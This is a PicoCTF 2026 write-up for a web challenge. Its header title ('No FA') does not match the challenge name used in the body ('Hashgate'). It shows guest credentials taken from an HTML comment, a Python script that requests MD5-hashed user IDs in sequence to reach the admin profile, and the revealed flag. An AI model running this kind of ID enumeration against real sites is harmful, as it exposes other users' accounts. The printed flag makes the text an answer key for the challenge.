---
title: "No FA"
date: 2026-04-01
layout: writeup
platform: PicoCTF
categories: [Web Exploitation]
tags: [web,IDOR]
difficulty: medium
challenge link: https://play.picoctf.org/practice/challenge/750?category=1&difficulty=2&originalEvent=79&page=1
---

# No FA

Writeup for Hashgate challenge of PicoCTF 2026.

## Login page and URL

Upon inspecting the html of the page we get the credentials for guest:

```
<!-- Email: guest@picoctf.org Password: guest -->
```

Upon logging in we get the response:
```
Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.
```

Also we notice that the url of the page contains the md5 hash of the number 3000.
>http://crystal-peak.picoctf.net:XXXXX/profile/user/e93028bdc1aacdfb3687181f2031765d

And the description tells us that there are about 20 employees in the company.
Hence we use a python script to check around +-20 range of 3000 for flag, by adding the md5 hash of each id into the url.

## Script
```
import requests
import hashlib

url = "http://crystal-peak.picoctf.net:XXXXX/profile/user/"

for i in range(2980, 3020):
    # Create the MD5 hash of the ID
    uid_hash = hashlib.md5(str(i).encode()).hexdigest()
    
    # Request the page
    response = requests.get(url + uid_hash)
    
    # Check if 'picoCTF' or 'admin' appears in the response
    if "picoCTF" in response.text:
        print(f"Found Flag at ID {i} (Hash: {uid_hash})")
        print(response.text)
        break
```

Upon running the script we recive the flag on user ID 3019 in output:

```
Found Flag at ID 3019 (Hash: a74c3bae3e13616104c1b25f9da1f11f)
Welcome, admin! Here is the flag: XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


## Flag

<details>
  <summary>Show flag</summary>
  
  > `picoCTF{id0r_unl0ck_c814750d}`
</details>
